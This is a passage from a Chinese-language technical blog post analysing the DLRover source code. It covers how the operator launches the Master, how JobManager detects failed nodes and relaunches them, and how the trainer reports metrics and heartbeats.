\u0026amp;corev1.EnvVarSource{ FieldRef: \u0026amp;corev1.ObjectFieldSelector{ APIVersion: \u0026#34;v1\u0026#34;, FieldPath: \u0026#34;status.podIP\u0026#34;, }, }, } podTemplate.Spec.Containers[0].Env = append(podTemplate.Spec.Containers[0].Env, podIPEnv) job.Spec.ReplicaSpecs[ReplicaTypeJobMaster] = \u0026amp;elasticv1alpha1.ReplicaSpec{ ReplicaSpec: commonv1.ReplicaSpec{ Template: *podTemplate, }, } } 创建了类似下面启动命令的一个 Pod，然后设置了一些环境变量。\n1 2 3 4 5 6 - command: - /bin/bash - -c - python -m dlrover.python.master.main --platform pyk8s --namespace dlrover --job_name torch-mnist-single-job-testing-1 --port 50001 image: registry.cn-beijing.aliyuncs.com/intell-ai/dlrover:master imagePullPolicy: Always 由于重启策略是 Never，也就是说如果 DLRover Master Pod 挂了，不会自动重启。\n1.5 小结 DLRover Operator 非常轻量，没有核心的处理逻辑实现，主要是:\n使用 CRD 描述 Job 任务、ScalePlan 扩容任务，实现字段、参数的转换 启动 DLRover Master Pod，让 DLRover 接管 Job 任务 2. DLRover Master 执行入口 1 2 3 4 def main(): args = parse_master_args() exit_code = run(args) return exit_code 参数解析 --port 默认值 0，监听 master 的端口\n--node_num 默认值 1，节点数量\n--namespace 默认值 default ，创建 Pod 的命名空间\n--platform 默认值 pyk8s，平台类型，可选 pyk8s，k8s，ray，local\n启动逻辑 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 def run(args): job_args = new_job_args(args.platform, args.job_name, args.namespace) job_args.initilize() logger.info(\u0026#34;Job args : %s\u0026#34;, job_args.to_json(indent=4)) _dlrover_context.config_master_port(port=args.port) if job_args.platform == PlatformType.LOCAL: from dlrover.python.master.local_master import LocalJobMaster worker = job_args.node_args[NodeType.WORKER].group_resource worker.count = args.node_num master = LocalJobMaster(_dlrover_context.master_port, job_args) else: from dlrover.python.master.dist_master import DistributedJobMaster update_context(job_args) master = DistributedJobMaster(_dlrover_context.master_port, job_args) master.prepare() return master.run() 这里的关键就是 class DistributedJobMaster(JobMaster) 类。\nMaster 主要实现:\n启动节点(例如，在 Kubernetes 上启动 Pod) 构建 rendezvous 训练节点集合 监控节点状态，在节点故障时启动新的节点进行恢复 收集每个节点的训练指标，包括吞吐量和工作负载 自动调节任务的节点数量，以加速训练并提高资源利用率 相关组件：\nJobManager，管理任务的节点。任务管理器可以启动节点、监控节点以及对节点进行扩容或缩容 RendezvousManager，构建训练节点的集合 TaskManager，分配数据分片任务给工作节点，并在工作节点故障时恢复数据分片任务 MetricCollector，收集训练任务的指标 ElasticPSService，管理参数服务器训练任务中存活的参数服务器节点 2.1 JobManager JobManager 管理任务的节点。任务管理器可以启动节点、监控节点以及对节点进行扩容或缩容。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 def create_job_manager(args: JobArgs, speed_monitor) -\u0026gt; DistributedJobManager: critical_worker_index = get_critical_worker_index(args) # Custom distribution strategy does not exit if there are pending nodes wait_pending_relaunch = ( args.distribution_strategy == DistributionStrategy.CUSTOM ) elastic_job = new_elastic_job(args.platform, args.job_name, args.namespace) node_watcher = new_node_watcher( args.platform, args.job_name, args.namespace ) job_scaler = new_job_scaler(args.platform, args.job_name, args.namespace) node_error_monitor = K8sJobErrorMonitor( args.namespace, args.cordon_fault_node ) return DistributedJobManager( job_args=args, critical_worker_index=critical_worker_index, wait_pending_relaunch=wait_pending_relaunch, speed_monitor=speed_monitor, job=elastic_job, node_watcher=node_watcher, job_scaler=job_scaler, error_monitor=node_error_monitor, ) JobManager 中包含大量的操作句柄:\n监控训练速度的 speed_monitor 1 2 3 4 5 6 7 8 9 10 11 12 def running_speed(self): if len(self._global_step_records) \u0026lt; 2: return 0 last_record = self._global_step_records[-1] first_record = self._global_step_records[-2] time_diff = last_record.timestamp - first_record.timestamp if time_diff \u0026lt;= 0: return 0 speed = (last_record.global_step - first_record.global_step) / ( time_diff ) return speed 通过 dlrover-run 使用 gRPC 上报训练速度，调用 _collect_global_step 更新相关指标。\n获取 Job 相关 Pod 名字、Service 地址的 elastic_job 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class K8sElasticJob(ElasticJob): def __init__(self, job_name, namespace): self._k8s_client = k8sClient.singleton_instance(namespace) self._namespace = namespace self._job_name = job_name def get_node_name(self, type, id): return get_pod_name(self._job_name, type, id) def get_node_service_addr(self, type, id): service_name = get_pod_name(self._job_name, type, id) return \u0026#34;%s.%s.svc:%d\u0026#34; % ( service_name, self._namespace, NODE_SERVICE_PORTS[type], ) 获取 Job 相关 Pod 列表、监听事件的 new_node_watcher DLRover 的 Node 对应 Kubernetes 的 Pod。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 class PodWatcher(NodeWatcher): def watch(self): resource_version = None pod_list = self._k8s_client.list_namespaced_pod(self._job_selector) if pod_list: resource_version = pod_list.metadata.resource_version try: stream = watch.Watch().stream( self._k8s_client.client.list_namespaced_pod, self._namespace, label_selector=self._job_selector, resource_version=resource_version, timeout_seconds=60, ) for event in stream: node_event = _convert_pod_event_to_node_event(event) if not node_event: continue yield node_event except Exception as e: def list(self) -\u0026gt; List[Node]: nodes: List[Node] = [] pod_list = self._k8s_client.list_namespaced_pod(self._job_selector) if not pod_list: return nodes if not pod_list.items: return nodes ... 操作 ScalePlan 的 new_job_scaler 1 2 3 4 5 6 7 8 9 10 11 class ElasticJobScaler(Scaler): ... def scale(self, plan: ScalePlan): scale_plan_crd = self._generate_scale_plan_crd(plan) self._client.create_custom_resource( group=ElasticJobApi.GROUP, version=ElasticJobApi.VERION, plural=ElasticJobApi.SCALEPLAN_PLURAL, body=scale_plan_crd.to_dict(), ) self._scaleplan_index += 1 处理异常的 K8sJobErrorMonitor 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 def _handle_process_error( self, node: Node, restart_count: int, error_data: str ): if restart_count not in self._restart_errors: self._restart_errors[restart_count] = error_data logger.error( f\u0026#34;{node.type}-{node.id} on {node.host_name} \u0026#34; f\u0026#34;restart {restart_count} fails: {error_data}\u0026#34; ) return False def _handle_node_error(self, node: Node, error_data: str): logger.info( f\u0026#34;{node.name} on {node.host_name} is down. \u0026#34; f\u0026#34;Reason: {error_data}\u0026#34; ) if self.cordon_node_eanbled: succeed = self._k8s_client.cordon_node(node.host_name) if succeed: logger.info(f\u0026#34;Node {node.name} is marked unschedulable.\u0026#34;) return True 2.2 RendezvousManager RendezvousManager，构建训练节点的集合。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class ElasticTrainingRendezvousManager(RendezvousManager): def get_comm_world( self, node_rank ) -\u0026gt; Tuple[int, int, Dict[int, NodeTopologyMeta]]: \u0026#34;\u0026#34;\u0026#34;如果一个集合点（rendezvous）轮次完成，则返回通信世界（communication world）。 当满足以下任一条件时，集合点完成： 1. 等待节点列表的大小等于最大节点数（max_nodes）。 2. 等待节点列表的大小大于最小节点数（min_nodes），且等于存活节点列表的大小。此外，在等待超时（waiting_timeout）期间，没有更多的工作节点加入集合点。 返回值： - rdzv_round：轮次索引。 - group：组索引。 - world：类似于 {0: 8, 1: 8, 2: 8} 的字典，其中键是节点ID，值是节点的本地世界大小。 \u0026#34;\u0026#34;\u0026#34; ... 2.3 TaskManager TaskManager，分配数据分片任务给工作节点，并在工作节点故障时恢复数据分片任务。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 class TaskManager(object): \u0026#34;\u0026#34;\u0026#34;创建并分发任务，跟踪任务的生命周期。\u0026#34;\u0026#34;\u0026#34; def __init__(self, worker_restart_timeout: int, speed_monitor: SpeedMonitor): \u0026#34;\u0026#34;\u0026#34; 初始化 TaskManager，设置工作节点重启超时时间和速度监控器。 \u0026#34;\u0026#34;\u0026#34; def new_dataset( self, batch_size, dataset_size, dataset_name, dataset_splitter: DatasetSplitter, task_type=elastic_training_pb2.NONE, ): \u0026#34;\u0026#34;\u0026#34; 创建一个新数据集，并初始化任务管理。 \u0026#34;\u0026#34;\u0026#34; def get_dataset_task(self, node_type, node_id, dataset_name): \u0026#34;\u0026#34;\u0026#34; 获取指定数据集、节点类型和节点 ID 的下一个任务。 \u0026#34;\u0026#34;\u0026#34; def get_dataset(self, dataset_name): \u0026#34;\u0026#34;\u0026#34; 根据数据集名称获取数据集。 \u0026#34;\u0026#34;\u0026#34; ... 2.4 MetricCollector MetricCollector，收集训练任务的指标。\n1 2 3 4 5 6 7 8 9 10 11 12 def _create_metric_collector_if_needed(self, params: JobArgs): if not params.enable_dynamic_sharding: return None job_uuid = params.job_uuid reporter = ReporterType.LOCAL if params.optimize_mode == OptimizeMode.CLUSTER: reporter = ReporterType.DLROVER_BRAIN collector = JobMetricCollector( job_uuid, params.namespace, params.cluster, params.user, reporter ) collector.collect_job_type(params.distribution_strategy) return collector 这里有一个判断，params.optimize_mode 为 cluster 时，上报的数据会由 BrainReporter 上报存储到 MySQL，否则会由 LocalReporter 上报存储到 DLRover Master 的内存中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 class JobMetricCollector(BaseMetricCollector): def collect_dataset_metric(self, name, size, ds_type=DatasetType.TEXT): pass def def collect_training_hyper_params(self, epoch, batch_size): pass def collect_job_type(self, job_type): pass def collect_model_metric(self, model_info: ModelInfo): pass def _report_runtime_stats(self): pass def collect_custom_data(self, metric_dict=None): pass def collect_runtime_stats( self, speed_monitor: SpeedMonitor, running_nodes: List[Node] ): pass def report_runtime_stats_periodically(self): pass def collect_job_exit_reason(self, reason): pass 另一方面，在 MasterServicer 中也会接收来自 Agent 使用 gRPC 上报的数据。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 class MasterServicer(elastic_training_pb2_grpc.MasterServicer): def report(self, request, _): message = grpc.deserialize_message(request.data) if isinstance(message, grpc.DatasetShardParams): success = self._collect_dataset_shard_params(message) elif isinstance(message, grpc.ResourceStats): success = self._update_node_resource_usage( node_type, node_id, message ) elif isinstance(message, grpc.ModelInfo): success = self._collect_model_info(message) elif isinstance(message, grpc.GlobalStep): success = self._collect_global_step(message) elif isinstance(message, grpc.ShardCheckpoint): success = self._restore_shard_checkpoint(message) elif isinstance(message, grpc.TaskResult): success = self._report_task_result(message) elif isinstance(message, grpc.ClusterVersion): success = self._update_cluster_version(message) elif isinstance(message, grpc.NodeAddress): success = self._update_node_address(message) elif isinstance(message, grpc.NetworkStatus): success = self._update_node_status(message) elif isinstance(message, grpc.NodeEvent): success = self._update_node_event(message) elif isinstance(message, grpc.SyncJoin): success = self._join_sync(node_type, node_id, message) elif isinstance(message, grpc.SyncFinish): success = self._sync_finished(message) elif isinstance(message, grpc.SyncBarrier): ... 2.5 ElasticPSService ElasticPSService 管理 Parameter Server 训练任务中的参数节点。\n1 2 3 4 def _create_elastic_ps_service_if_needed(params: JobArgs): if params.distribution_strategy == DistributionStrategy.PS: return ElasticPsService() return None 仅对 Parameter Server 任务有效，主要是管理 PS 任务的版本。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 class ElasticPsService(object): def __init__(self): self._global_version = 0 self._ps_local_version = {} self._worker_local_version = {} self._worker_restored_version = {} def inc_global_cluster_version(self): \u0026#34;\u0026#34;\u0026#34; 增加全局集群版本号 \u0026#34;\u0026#34;\u0026#34; pass def get_ps_version(self, version_type, ps_id): \u0026#34;\u0026#34;\u0026#34; 获取参数服务器（PS）的版本 参数: version_type: 版本类型（全局或本地） ps_id: 参数服务器的ID \u0026#34;\u0026#34;\u0026#34; pass def update_ps_version(self, ps_id, version_type, version): \u0026#34;\u0026#34;\u0026#34; 更新参数服务器（PS）的版本 参数: ps_id: 参数服务器的ID version_type: 版本类型（全局或本地） version: 要设置的版本号 \u0026#34;\u0026#34;\u0026#34; pass def get_worker_version(self, version_type, worker_id): \u0026#34;\u0026#34;\u0026#34; 获取工作节点的版本 参数: version_type: 版本类型（全局、本地或恢复的版本） worker_id: 工作节点的ID \u0026#34;\u0026#34;\u0026#34; pass def update_worker_version(self, worker_id, version_type, version): \u0026#34;\u0026#34;\u0026#34; 更新工作节点的版本 参数: worker_id: 工作节点的ID version_type: 版本类型（全局、本地或恢复的版本） version: 要设置的版本号 \u0026#34;\u0026#34;\u0026#34; pass 2.6 运行 prepare 启动 gRPC 和本地 Manager 进程 1 2 3 4 5 6 7 def prepare(self): # 启动 Master 上的 RPC 服务，以供与 Worker 节点通信 self._master_server.start() if self.task_manager: self.task_manager.start() if self.job_manager: self.job_manager.start() 在运行之前，还有需要在 Master 启动 RPC 服务，启动 TaskManager 和 JobManager。\n启动 TaskManager 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 def start(self): if self._worker_restart_timeout \u0026gt; 0: threading.Thread( target=self._check_and_reassign_timeout_tasks, name=\u0026#34;check_timeout_tasks\u0026#34;, daemon=True, ).start() def _check_and_reassign_timeout_tasks(self): \u0026#34;\u0026#34;\u0026#34;Check whether there are timeout tasks periodically.\u0026#34;\u0026#34;\u0026#34; logger.info(\u0026#34;Start the thread to monitor timeout tasks.\u0026#34;) while True: for _, dataset in self._datasets.items(): # Copy doing task list because the doing list will pop items # in the following loop. doing_tasks = dataset.doing.copy() cur = time.time() for task_id, doing_task in doing_tasks.items(): start = self._worker_start_task_time.get( doing_task.node_id, cur ) if ( doing_task.task.task_type == elastic_training_pb2.EVALUATION and cur - start \u0026gt; max( _TASK_TIMEOUT_THRESHOLD_SECS, self._worker_restart_timeout, ) ): logger.info( f\u0026#34;The task {task_id} of {doing_task.node_type}-\u0026#34; f\u0026#34;{doing_task.node_id} is timeout.\u0026#34; ) dataset.report_task_status(task_id, success=False) self._invoke_task_timeout_callback(doing_task.node_id) break time.sleep(30) 启动 JobManager 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 def start(self): self._scaler.start() self._job_optimizer.update_job_uuid(self._job_args.job_uuid) self._job_optimizer.init_job_resource(self._job_resource) self._adjust_worker_for_estimator() self._init_nodes() self._init_job_auto_scaler() plan = self._create_initial_scale_plan() if not self._has_running_workers(): # The the job relaunches the evicted master, there are alive # worker nodes and the master does not need to launch workers. self._scaler.scale(plan) else: logger.info( \u0026#34;The recovered master skips launching workers at begining.\u0026#34; ) worker_num = 0 if NodeType.WORKER in plan.node_group_resources: worker_num = plan.node_group_resources[NodeType.WORKER].count if NodeType.CHIEF in plan.node_group_resources: worker_num += plan.node_group_resources[NodeType.CHIEF].count self._speed_monitor.set_target_worker_num(worker_num) threading.Thread( target=self._monitor_nodes, name=\u0026#34;node_monitor\u0026#34;, daemon=True ).start() threading.Thread( target=self._monitor_node_heart_beat, name=\u0026#34;node_heart_beat_monitor\u0026#34;, daemon=True, ).start() if os.getenv(\u0026#34;KUBERNETES_SERVICE_HOST\u0026#34;): threading.Thread( target=self._monitor_scale_plan_crd, name=\u0026#34;scaleplan_monitor\u0026#34;, daemon=True, ).start() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 def _monitor_nodes(self): logger.info(\u0026#34;Start monitoring nodes events.\u0026#34;) while True: try: nodes = self._node_watcher.list() self._process_list_nodes(nodes) if self._stop_monitor: logger.info(\u0026#34;Stop processing node events\u0026#34;) break # watch pod 的状态，并封装为 NodeEvent，给 _process_event 统一处理 for event in self._node_watcher.watch(): try: self._process_event(event) except Exception as e: logger.warning(e) detail_trace_back = traceback.format_exc() logger.warning(detail_trace_back) except Exception as e: logger.warning(e) time.sleep(30) time.sleep(5) 处理节点的心跳事件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 def _monitor_node_heart_beat(self): logger.info(\u0026#34;Start monitoring the heart beat of nodes.\u0026#34;) while True: with self._lock: events = self._get_dead_node_event() # 超过 300s 没有响应，则认为节点异常 for event in events: try: self._process_event(event) except Exception as e: logger.warning(e) detail_trace_back = traceback.format_exc() logger.warning(detail_trace_back) time.sleep(15) 这里的 _get_dead_node_event 就是获取异常的 Pod 的事件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 def _get_dead_node_event(self, window_interval=300) -\u0026gt; List[NodeEvent]: now = time.time() dead_events = [] for _, nodes in self._job_nodes.items(): for _, node in nodes.items(): if ( node.heartbeat_time \u0026gt; 0 and now - node.heartbeat_time \u0026gt; window_interval and node.status == NodeStatus.RUNNING ): event_node = copy.deepcopy(node) event_node.status = NodeStatus.FAILED event_node.exit_reason = NodeExitReason.NO_HEARTBEAT event = NodeEvent( event_type=NodeEventType.DELETED, node=event_node, ) dead_events.append(event) error_data = ( f\u0026#34;No heartbeat for over {window_interval} seconds.\u0026#34; ) self._error_monitor.process_error( node, node.relaunch_count, error_data, TrainingExceptionLevel.NODE_ERROR, ) logger.warning( f\u0026#34;The node {node.name} has not sent a heartbeat \u0026#34; f\u0026#34;for over {window_interval} seconds.\u0026#34; ) return dead_events 这里可以看到最核心的是调用了 _process_event 以及 _process_node_events 函数。\n2.7 异常处理逻辑 1 2 3 4 5 6 7 def _process_event(self, event: NodeEvent): with self._lock: should_relaunch = self._should_relaunch( cur_node, status_change_flow ) if should_relaunch: self._relaunch_node(cur_node) 第一步，判断是否需要重启\n需要注意，这里 Node 的 exit_reason 是对 Pod 的封装和转换，而不是直接代表 Pod 的状态。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 def _should_relaunch(self, node: Node, status_change_flow: NodeStateFlow): should_relaunch = ( status_change_flow.should_relaunch and self._enable_relaunch_node and node.relaunchable ) if should_relaunch: # 排除一些特殊情况，Error、OOM、超过最大重启次数、Killed if ( node.exit_reason == NodeExitReason.FATAL_ERROR and not _dlrover_context.relaunch_always ): should_relaunch = False elif node.exit_reason == NodeExitReason.OOM: mem = node.config_resource.memory if mem \u0026gt;= NodeResourceLimit.MAX_MEMORY: should_relaunch = False logger.warning( \u0026#34;The memory of worker %s is beyond the limit %s MB.\u0026#34;, mem, NodeResourceLimit.MAX_MEMORY, ) elif node.relaunch_count \u0026gt;= node.max_relaunch_count: should_relaunch = False logger.warning( \u0026#34;The relaunched count %s is beyond the maximum %s.\u0026#34;, node.relaunch_count, node.max_relaunch_count, ) else: node.is_recovered_oom = True self._job_optimizer.adjust_oom_resource(node) elif node.exit_reason != NodeExitReason.KILLED: if node.relaunch_count \u0026gt;= node.max_relaunch_count: logger.warning( \u0026#34;The relaunch count \u0026#34; f\u0026#34;{node.relaunch_count}/{node.max_relaunch_count} \u0026#34; \u0026#34;has been exhausted.\u0026#34; ) should_relaunch = False return should_relaunch 第二步，重启 Node 节点，即 Pod\n在 AllReduce 策略下，就是创建 Worker 节点。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 def _relaunch_node(self, node: Node): if node.type == NodeType.WORKER: plan = self._worker_manager.relaunch_node( node, self._remove_exited_node ) elif node.type == NodeType.PS: plan = self._ps_manager.relaunch_node( node, self._remove_exited_node ) elif node.type == NodeType.EVALUATOR: plan = self._evaluator_manager.relaunch_node( node, self._remove_exited_node ) elif node.type == NodeType.CHIEF or node.type == NodeType.MASTER: plan = self._chief_manager.relaunch_node( node, self._remove_exited_node ) else: logger.error(\u0026#34;Not support node type %s\u0026#34;, node.type) self._set_ps_addrs_in_plan(plan) if self._remove_exited_node: plan.remove_nodes.append(node) node.relaunchable = False # Avoid repeatedly relaunching the node. self._scaler.scale(plan) 在创建一个 ScalePlan 时，需要获取旧节点的 rank_index、service_addr 等信息，用于创建新的 Pod 节点。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 def relaunch_node(self, node: Node, remove_exited_node=False): plan = ScalePlan() with self._lock: new_id = next(self._node_id_iter) relaunch_node = node.get_relaunch_node_info(new_id) self._nodes[new_id] = relaunch_node logger.info(\u0026#34;Relaunch node %s to %s\u0026#34;, node.name, new_id) plan.launch_nodes.append( Node( node.type, new_id, copy.deepcopy(relaunch_node.config_resource), rank_index=node.rank_index, name=self._new_node_name_fn(node.type, new_id), service_addr=node.service_addr, relaunch_count=relaunch_node.relaunch_count, ) ) if remove_exited_node and not node.is_released and node.exited(): node.is_released = True plan.remove_nodes.append(node) return plan ScalePlan 不会提交为 CR 对象给 K8s，而是根据不同运行时给了不同的 _scaler。\n1 2 3 4 5 6 7 8 9 10 11 class PodScaler(Scaler): def scale(self, plan: ScalePlan): with self._lock: for type, group_resource in plan.node_group_resources.items(): if group_resource.count \u0026gt; len(cur_pods): self._scale_up_pods(type, plan, cur_pods, max_pod_id) elif group_resource.count \u0026lt; len(cur_pods): self._scale_down_pods(type, plan, cur_pods) for node in plan.launch_nodes: self._create_node_queue.append(node) self._update_job_pods(job_pods) 在 K8s 下 Worker 节点都是 PodScaler 创建出来的。 _scale_up_pods 会将创建的 Pod 节点加入到 _create_node_queue 中。\n2.8 运行 run 启动任务 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 def run(self): \u0026#34;\u0026#34;\u0026#34; The main loop of master. Dispatch the tasks to the workers until all the tasks are completed. \u0026#34;\u0026#34;\u0026#34; try: while True: if self._stop_requested: break msg = self.job_manager.early_stop() if msg: self.request_stop(False, msg) continue self.job_manager.clear_exited_nodes() if self.job_manager and self.job_manager.all_workers_exited(): if self.job_manager.pend_without_workers(): time.sleep(30) continue if self.job_manager.all_workers_failed(): logger.error(\u0026#34;All workers failed\u0026#34;) self._exit_code = 1 self._exit_reason = JobExitReason.UNKNOWN_ERROR elif ( self.task_manager and not self.task_manager.finished() ): logger.warning( \u0026#34;All workers exited but there also are \u0026#34; \u0026#34;unfinished tasks\u0026#34;, ) break if ( self.job_manager.all_running_node_hanged() and self.task_manager.task_hanged() ): logger.error(\u0026#34;All nodes hangeds\u0026#34;) self._exit_code = 1 self._exit_reason = JobExitReason.HANG_ERROR if ( self.task_manager and self.task_manager.finished() and ( not self.job_manager or self.job_manager.all_critical_node_completed() ) ): logger.info(\u0026#34;All task completed\u0026#34;) break time.sleep(30) master 会执行一个死循环，每隔 30s 检测一次状态。具有如下状态时，master 会退出:\n收到停止请求 self._stop_requested 所有 worker 已退出 self.job_manager.all_workers_exited() task_manager 已完成 self.task_manager.finished() 2.9 小结 DLRover 容错的逻辑主要在 Master 中，而其中的关键在 JobManager。\n监控的数据源有如下几类:\nAgent 上报的数据，包括指标、训练速度等 Master 从 K8s 获取的 Pod 事件数据 JobManager 基于这些上报的数据，封装为 NodeEvent 对象，然后统一由 _process_event 处理。\n3. DLRover Trainer 3.1 启动脚本 1 2 3 4 5 6 7 8 9 10 cat /usr/local/bin/dlrover-run #!/usr/local/bin/python # -*- coding: utf-8 -*- import re import sys from dlrover.trainer.torch.main import main if __name__ == \u0026#39;__main__\u0026#39;: sys.argv[0] = re.sub(r\u0026#39;(-script\\.pyw|\\.exe)?$\u0026#39;, \u0026#39;\u0026#39;, sys.argv[0]) sys.exit(main()) 3.2 入口函数 dlrover.trainer.torch.main 调用的是 dlrover.trainer.torch.elastic_run.main\n1 2 3 4 @record def main(args=None): args = parse_args(args) run(args) 包了一层入口而已，没有实际逻辑。\n3.3 参数解析 --network-check，在训练之前，先检查网络状态。\n--node_unit，设置节点单元数量，调度的节点数应为此数量的倍数。\n--auto_config，自动配置节点和每个节点的进程数。\n--auto_tunning，自动调整并行配置。\n--exclude-straggler，排除落后节点，仅在 network_check 开启时有效。\n--save_at_breakpoint，训练失败时保存检查点到内存。\n--accelerator，设置机器的加速器类型，如 nvidia.com/gpu 或 ascend-npu。\n3.4 启动训练任务 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 def run(args): # 连接 DLRover Master dlrover_master_ready = grpc.addr_connected(master_addr) _, max_nodes = parse_min_max_nnodes(args.nnodes) # 如果没有就绪，并且 `node_rank == 0` 就将当前节点作为 DLRover Master 启动 if not dlrover_master_ready and node_rank == 0: # Only start the dlrover master on the rank-0 node. master_handler, master_addr = _launch_dlrover_local_master( master_addr, job_name, max_nodes, ) logger.info(f\u0026#34;Set the dlrover master addr as {master_addr}\u0026#34;) os.environ[NodeEnv.DLROVER_MASTER_ADDR] = master_addr use_dlrover_launch = _check_to_use_dlrover_run(master_addr, max_nodes) if args.standalone and not use_dlrover_launch: args.rdzv_backend = \u0026#34;c10d\u0026#34; args.rdzv_endpoint = \u0026#34;localhost:29400\u0026#34; args.rdzv_id = str(uuid.uuid4()) logger.info( f\u0026#34;\\n**************************************\\n\u0026#34; f\u0026#34;Rendezvous info:\\n\u0026#34; f\u0026#34;--rdzv-backend={args.rdzv_backend} \u0026#34; f\u0026#34;--rdzv-endpoint={args.rdzv_endpoint} \u0026#34; f\u0026#34;--rdzv-id={args.rdzv_id}\\n\u0026#34; f\u0026#34;**************************************\\n\u0026#34; ) # 解析训练参数 config, cmd, cmd_args = _elastic_config_from_args(args) config.run_id = job_name config.role = \u0026#34;dlrover-trainer\u0026#34; try: # 启动训练 elastic_launch( config=config, entrypoint=cmd, use_dlrover_launch=use_dlrover_launch, )(*cmd_args) finally: if master_handler: master_handler.close() 1 2 3 4 5 6 7 8 class elastic_launch: def __call__(self, *args): if self._use_dlrover_launch: return launch_agent(self._config, self._entrypoint, list(args)) else: return torch_launch_agent( self._config, self._entrypoint, list(args) ) 如果没有使用 dlrover 托管就直接使用 from torch.distributed.launcher.api import launch_agent as torch_launch_agent 启动训练。否则使用下面的函数启动训练:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 def launch_agent( config: ElasticLaunchConfig, entrypoint: Union[Callable, str, None], args: List[Any], ) -\u0026gt; Dict[int, Any]: # 生成唯一的 `run_id` if not config.run_id: run_id = str(uuid.uuid4().int) logger.warning( f\u0026#34;config has no run_id, generated a random run_id: {run_id}\u0026#34; ) config.run_id = run_id # 初始化监控 monitor = TorchTrainingMonitor(ConfigPath.RUNTIME_METRICS) monitor.start() # 初始化 Agent ... agent = ElasticTrainingAgent( node_rank=node_rank, config=config, entrypoint=entrypoint, spec=spec, start_method=config.start_method, log_dir=config.log_dir, ) try: metrics.initialize_metrics(metrics.MetricsConfig(config.metrics_cfg)) # 启动 agent result = agent.run() ... 1 2 class ElasticTrainingAgent(LocalElasticAgent): ... 可以看到 DLRover 使用了 PyTorch 内置的 LocalElasticAgent 负责管理节点上的训练进程。\n3.5 数据上报 从上面可以看到，在启动 Agent 时，会启动一个监控任务的进程。\n1 2 3 4 5 6 7 def launch_agent( config: ElasticLaunchConfig, entrypoint: Union[Callable, str, None], args: List[Any], ) -\u0026gt; Dict[int, Any]: monitor = TorchTrainingMonitor(ConfigPath.RUNTIME_METRICS) monitor.start() 在这个监控进程中，会周期性地上报节点的资源使用情况。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class TorchTrainingMonitor(Singleton): def start(self): if os.getenv(NodeEnv.MONITOR_ENABLED, \u0026#34;false\u0026#34;) != \u0026#34;true\u0026#34;: return self._resource_monitor.start() thread = threading.Thread( target=self._periodically_report, name=\u0026#34;report-step\u0026#34;, daemon=True, ) thread.start() def _periodically_report(self): while True: if self._group_rank == 0: self.report_resource_with_step() self.send_heartbeat() time.sleep(15) 有两个上报数据的流程:\n第一种是，在 Pod 中使用 psutil 获取资源使用情况。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class ResourceMonitor(Singleton): def report_resource(self): try: used_mem = get_used_memory() cpu_percent = get_process_cpu_percent() if self._gpu_enabled: self._gpu_stats = get_gpu_stats() current_cpu = round(cpu_percent * self._total_cpu, 2) self._master_client.report_used_resource( used_mem, current_cpu, self._gpu_stats ) logger.debug( \u0026#34;Report Resource CPU : %s, Memory %s, GPU %s\u0026#34;, current_cpu, used_mem, self._gpu_stats, ) except Exception as e: logger.exception(e) 第二种是，从 /tmp/dlrover/runtime_metrics.json 文件中获取，训练速度。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 def report_resource_with_step(self): if self._group_rank != 0: return try: if not os.path.exists(self._metrics_path): return with open(self._metrics_path, \u0026#34;r\u0026#34;) as f: record = json.load(f) step = record.get(\u0026#34;step\u0026#34;, 0) timestamp = record.get(\u0026#34;timestamp\u0026#34;, 0) if step \u0026gt; 0 and timestamp - self._last_timestamp \u0026gt; 15: self._resource_monitor.report_resource() self._last_timestamp = timestamp self._master_client.report_global_step( step, self._last_timestamp, ) except Exception as e: logger.warning(e) ElasticTrainer 会从记录的梯度状态中，将 num_steps 和 timestamp 写入到约定的指标文件。\n1 2 3 4 5 6 7 8 9 class ElasticTrainer(object): def report_training_step(self): timestamp = time.time() record = TrainingRecord(self.gradient_state.num_steps, timestamp) metric_path = os.getenv(ConfigPath.ENV_RUNTIME_METRICS, \u0026#34;\u0026#34;) rank = get_rank() if os.path.exists(os.path.dirname(metric_path)) and rank == 0: with open(metric_path, \u0026#34;w\u0026#34;) as f: 